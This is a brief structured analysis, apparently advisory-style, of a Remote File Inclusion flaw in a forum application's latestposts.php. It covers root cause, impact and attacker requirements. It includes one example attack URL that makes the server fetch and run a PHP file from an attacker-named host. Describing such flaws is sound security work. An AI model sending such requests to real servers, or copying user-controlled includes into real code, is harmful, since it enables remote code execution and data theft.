```
- Root cause of vulnerability: The application includes the file config.php using a variable called $forumspath, which is derived from user input through the GET parameter forumspath in latestposts.php.
- Weaknesses/vulnerabilities present: Remote File Inclusion (RFI) vulnerability. The application does not sanitize user input, allowing an attacker to include arbitrary remote files.
- Impact of exploitation: An attacker can execute arbitrary code on the server by including a malicious remote file, potentially leading to complete system compromise, data theft, or denial of service.
- Attack vectors: By manipulating the forumspath parameter in the URL. For example, /latestposts.php?forumspath=http://evilc0der.com/evil.php.
- Required attacker capabilities/position: The attacker needs to be able to send HTTP requests to the vulnerable web server.
